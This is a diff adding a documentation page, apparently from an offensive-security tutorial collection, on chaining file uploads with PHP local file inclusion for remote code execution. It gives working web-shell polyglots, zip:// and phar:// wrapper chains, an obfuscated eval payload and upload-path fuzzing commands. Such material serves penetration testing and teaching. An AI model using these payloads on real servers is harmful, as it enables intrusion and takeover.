@@ -1,0 +1,362 @@
+---
+title: File-upload chain
+description: Chaining file upload + LFI for RCE - including uploaded images, zip://, and phar:// wrappers.
+mitre: [T1190, T1059, T1505.003]
+d3fend: [D3-EAL, D3-FA]
+impact: [ServerSideEval, RCE]
+owasp: [A03]
+sidebar:
+  order: 7
+  label: File-upload chain
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+When the application accepts uploads (avatar, attachment, document) and has an LFI sink that executes files, include the uploaded file. The upload doesn't need to be vulnerable - any upload that ends up on disk works.
+
+```
+# 1. Embed PHP in a file that looks like an image
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+
+# 2. Upload via the application's normal upload feature
+# (file is now at /profile_images/shell.gif or similar)
+
+# 3. Include via LFI - inclusion sink executes PHP regardless of extension
+?page=./profile_images/shell.gif&cmd=id
+
+# Alternate transports when raw image upload is filtered
+?page=zip://./uploads/shell.zip%23inner.php&cmd=id           # zip:// wrapper
+?page=phar://./uploads/shell.phar/inner.txt&cmd=id           # phar:// wrapper
+```
+
+Success indicator: command output in the response after triggering the LFI on the uploaded file.
+
+## Why this works
+
+The key property: **the LFI sink decides what's PHP based on content, not extension.** When the function is `include()` or `require()`, *any file containing `<?php ... ?>` will execute the PHP code* - regardless of whether the file is named `.gif`, `.jpg`, `.pdf`, or `.txt`.
+
+This means the file upload feature doesn't need a vulnerability. The web framework's "this is just an image" check has no bearing on what `include()` does with the file later. If you can:
+
+1. Get a file with PHP code onto disk anywhere the LFI can reach, and
+2. Find its path,
+
+…you have RCE.
+
+This chain is the most reliable LFI-to-RCE path on PHP apps because it doesn't require `allow_url_include` and doesn't depend on which wrappers are loaded.
+
+## Step 1 - Craft the malicious image
+
+Combine valid image bytes (the "magic bytes" identifying the file type) with PHP code:
+
+```bash
+# GIF - magic bytes "GIF8" are valid ASCII, easiest to handcraft
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+```
+
+This file:
+- Starts with `GIF8` - any image-content sniffer treats it as a (broken but recognizable) GIF
+- Contains valid PHP code
+- Will display as an invalid image in browsers (most don't error visibly, just show a broken-image icon)
+- Will execute as PHP when `include()`d
+
+The same technique with other formats:
+
+```bash
+# JPEG - magic bytes need binary; build with python
+python3 -c '
+import sys
+sys.stdout.buffer.write(b"\xff\xd8\xff\xe0\x00\x10JFIF<?php system($_GET[\"cmd\"]); ?>")
+' > shell.jpg
+
+# PNG - similar, slightly more byte gymnastics
+python3 -c '
+import sys
+sys.stdout.buffer.write(b"\x89PNG\r\n\x1a\n<?php system($_GET[\"cmd\"]); ?>")
+' > shell.png
+```
+
+GIF is preferred for handcrafting because its magic bytes are printable ASCII. JPEG and PNG work but require building the file with a script.
+
+### When real-image validation is in place
+
+If the upload check actually decodes the image and verifies dimensions/color depth, the simple "magic bytes + PHP" trick may fail. Workarounds:
+
+1. **Embed in image metadata.** EXIF tags accept arbitrary text:
+   ```bash
+   exiftool -Comment='<?php system($_GET["cmd"]); ?>' real-image.jpg
+   ```
+   The image remains a valid JPEG (passes any image library's check), but the EXIF comment contains PHP. When `include()`'d, PHP scans for `<?php ... ?>` anywhere in the file and executes.
+
+2. **Append to a real image:**
+   ```bash
+   cat real-image.png > shell.png
+   echo '<?php system($_GET["cmd"]); ?>' >> shell.png
+   ```
+   The PNG decoder reads up to the IEND chunk and stops; the trailing PHP is ignored by image decoders but visible to `include()`.
+
+The [File Upload Attacks](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) reference covers more aggressive bypasses (content-type vs. content mismatches, polyglot files). For LFI-chaining purposes, EXIF embedding and trailing-byte appending almost always work.
+
+## Step 2 - Upload through normal channels
+
+Upload via the application's intended upload feature. Examples of common upload sinks:
+
+- Profile picture / avatar upload
+- Document attachment in tickets, comments, or messages
+- Bulk import via CSV
+- Logo / brand image in admin settings
+- Resume / CV upload in job-board apps
+- Image attachment in CMS / wiki edits
+
+You don't need the upload to be misconfigured. The straightforward use case - "users can upload an avatar" - is enough.
+
+### Note on content-type checks
+
+Many upload endpoints check the `Content-Type` header in the request, not the file contents. Set it to match a real image:
+
+```http
+POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=---X
+
+-----X
+Content-Disposition: form-data; name="file"; filename="avatar.gif"
+Content-Type: image/gif
+
+GIF8<?php system($_GET["cmd"]); ?>
+-----X--
+```
+
+The `Content-Type: image/gif` line in the multipart body satisfies most lightweight checks. The actual file contents are still the polyglot.
+
+## Step 3 - Find the upload path
+
+You need the on-disk path of the uploaded file to include it. Several ways to find it:
+
+### From the application UI
+
+After uploading, the file usually displays somewhere - view source:
+
+```html
+<img src="/profile_images/shell.gif" class="profile-image">
+```
+
+The `src` attribute is the URL path, which maps directly to the on-disk path in most apps. If the webroot is `/var/www/html/` and the URL is `/profile_images/shell.gif`, the file is at `/var/www/html/profile_images/shell.gif`.
+
+### From the upload response
+
+The upload endpoint often returns the path in JSON:
+
+```json
+{
+  "success": true,
+  "path": "/profile_images/shell.gif",
+  "filename": "shell.gif"
+}
+```
+
+### From fuzzing
+
+When the path isn't disclosed, fuzz for common upload directories:
+
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ \
+     -u "https://target/FUZZ/shell.gif" \
+     -mc 200
+```
+
+Common upload directories:
+
+```
+/uploads/
+/upload/
+/files/
+/attachments/
+/profile_images/
+/avatars/
+/img/
+/static/uploads/
+/public/uploads/
+/user_data/
+/storage/
+/media/
+```
+
+### Renamed files
+
+Some apps rename uploaded files (UUID, hash, sequential ID). The application's UI usually shows the new name. If not, the upload response or a fuzzer hitting common naming patterns (`upload_1.gif`, `upload_2.gif`) sometimes reveals it.
+
+## Step 4 - Include via LFI
+
+Combine the path with the LFI sink:
+
+```
+?page=./profile_images/shell.gif&cmd=id
+?page=../../profile_images/shell.gif&cmd=id      # if LFI has a path prefix
+?page=/var/www/html/profile_images/shell.gif&cmd=id   # absolute path
+```
+
+The inclusion executes the PHP code in the file:
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+### Handling appended extensions
+
+When the LFI sink appends `.php`:
+
+```php
+include($_GET['page'] . ".php");
+```
+
+The naive `?page=./profile_images/shell.gif` becomes `./profile_images/shell.gif.php` - doesn't exist.
+
+Two options:
+
+1. **Upload as `shell.php` instead of `shell.gif`** if the upload validates extension by exact match:
+   ```bash
+   echo '<?php system($_GET["cmd"]); ?>' > shell.php
+   ```
+   Many uploads accept arbitrary extensions; some don't. Test.
+
+2. **Use a wrapper to bypass the extension append** - see [wrappers](/codex/web/lfi/wrappers/) or the `zip://` / `phar://` techniques below.
+
+## `zip://` chain
+
+Useful when the application accepts `.zip` uploads (file-attachment features sometimes do):
+
+```bash
+# Step 1 - create the PHP shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Step 2 - zip it, name the archive with an image extension
+zip shell.jpg shell.php
+
+# Step 3 - upload shell.jpg
+
+# Step 4 - include via the zip:// wrapper
+?page=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+The URL-encoded `%23` is `#`, which the `zip://` wrapper uses to specify the file inside the archive:
+
+```
+zip://./profile_images/shell.jpg#shell.php
+            └── archive path ──┘ └ inner file ┘
+```
+
+PHP opens the zip archive, extracts `shell.php`, runs it.
+
+### Caveats
+
+- Requires the `zip` PHP extension. Usually enabled but worth checking via `php://filter` on `php.ini`.
+- Some upload validators detect zip archives via content sniffing even when the extension is `.jpg` - they reject based on content type, not extension. Test.
+
+## `phar://` chain
+
+A PHAR (PHP Archive) is PHP's executable archive format. Building one with custom contents lets you specify a stub and inner files cleanly.
+
+### Step 1 - Build the PHAR
+
+```bash
+# Write the script that builds the PHAR
+cat > build-phar.php <<'EOF'
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+EOF
+
+# Compile (phar.readonly must be 0 to build)
+php --define phar.readonly=0 build-phar.php
+
+# Rename for upload
+mv shell.phar shell.jpg
+```
+
+The `setStub` line marks the start of the PHAR data - everything before `__HALT_COMPILER()` is treated as the script preamble, everything after is the archive payload.
+
+### Step 2 - Upload
+
+```bash
+curl -F "file=@shell.jpg" https://target/upload
+```
+
+### Step 3 - Include
+
+```
+?page=phar://./profile_images/shell.jpg/shell.txt&cmd=id
+```
+
+URL-encoded form (some apps URL-decode the path before the wrapper sees it):
+
+```
+?page=phar%3A%2F%2F.%2Fprofile_images%2Fshell.jpg%2Fshell.txt&cmd=id
+```
+
+### Caveats
+
+- The PHAR format has more compatibility than zip across PHP setups - `phar://` is part of core PHP, no extension required.
+- File-upload validators sometimes detect the PHAR magic bytes (`<?php __HALT_COMPILER();`) and reject. EXIF-embedded PHARs avoid this.
+- PHAR deserialization is a separate attack class - when an application calls `file_exists()` or `filesize()` on an attacker-controlled `phar://` URL, the deserializer triggers and can execute PHP via object instantiation. Outside this section's scope but worth knowing about.
+
+## When the upload directory is non-executable
+
+Some apps configure the upload directory to not execute PHP - e.g., `.htaccess` with `php_flag engine off`. This stops *direct* access to the file as a script (`https://target/uploads/shell.php?cmd=id` doesn't work), but **LFI execution still works** because `include()` doesn't go through Apache's mod_php directive resolution - it's PHP-internal.
+
+This means LFI + upload chain bypasses upload-directory hardening. The chain is robust precisely because the execution doesn't happen "in" the upload directory - it happens "in" the LFI sink's directory.
+
+## When uploads strip PHP tags
+
+A more aggressive defense: the upload endpoint scans contents for PHP tags (`<?php`, `<?=`, etc.) and rejects/strips them. Workarounds:
+
+1. **Encode the PHP in something the scanner doesn't decode.** Base64-encode the PHP body, then decode at runtime:
+   ```
+   <?php eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7")); ?>
+   ```
+   The string `"c3lzdGVtKCRfR0VUWyJjbWQiXSk7"` is `system($_GET["cmd"]);` base64-encoded. If the scanner only looks for tag-adjacent shell commands, the base64 obfuscation passes.
+
+2. **Use short tags** (when enabled):
+   ```
+   <?= system($_GET["cmd"]); ?>
+   ```
+   Some scanners only check for the full `<?php` opening tag.
+
+3. **Use the `zip://` or `phar://` chain** - the PHP code is inside an archive, not at the file's top level.
+
+## Combining with second-order LFI
+
+When the LFI is indirect (you set a username/path field that the app uses later), the file-upload chain composes:
+
+```
+1. Register with username "../uploads/shell"
+2. Upload shell.gif via the avatar feature → /uploads/shell.gif
+3. Trigger any feature that loads "<username>.png" → loads ../uploads/shell.gif (or shell.png if the LFI sink doesn't add extension)
+```
+
+The second-order chain is more constrained but works against some hardened apps that don't allow direct LFI in any obvious parameter.
+
+## Detection-only checks
+
+```bash
+# Confirm uploads land in a predictable place
+curl -F "file=@/path/to/normal.jpg" https://target/upload
+# Look at the response for path, or fetch /uploads/normal.jpg
+
+# Confirm LFI can reach the upload directory
+curl "https://target/?page=./uploads/normal.jpg"
+# If the JPEG bytes come back, LFI reaches the upload dir - chain is feasible
+```
+
+## Notes
+
+- **The chain is the most reliable LFI-to-RCE path.** Doesn't need `allow_url_include`, doesn't need network egress, doesn't need rare wrappers. Try this first when wrappers fail.
+- **The "image" doesn't have to be a real image.** Apps that don't decode-and-re-encode uploaded images accept the magic-bytes-prefix trick trivially. The "make a real image" workarounds are only needed when the upload re-encodes the file (less common than you'd think).
+- **`.htaccess` upload is also a chain primitive.** When uploads land in a directory and `.htaccess` is allowed, uploading a malicious `.htaccess` followed by a PHP file enables PHP execution in the upload directory itself - separate from LFI. Worth knowing for the upload page's own RCE.
+- **Tomcat / Jetty / ASP.NET equivalents.** Java apps with WAR upload and inclusion have the same shape - upload a JSP, include it via the LFI sink. ASP.NET with `.aspx` uploads and `<!--#include-->` sinks similar. The PHP path is documented in detail because that's the common case; the structure transfers.
+
+<Aside type="tip">
+The cleanest LFI-to-RCE proof: upload `shell.gif` containing `GIF8<?php system($_GET["cmd"]); ?>`, find the path from the application UI, include it. Three commands and a browser tab. No exotic wrappers, no network setup, no PHP config requirements - works on any vulnerable app with any upload feature.
+</Aside>
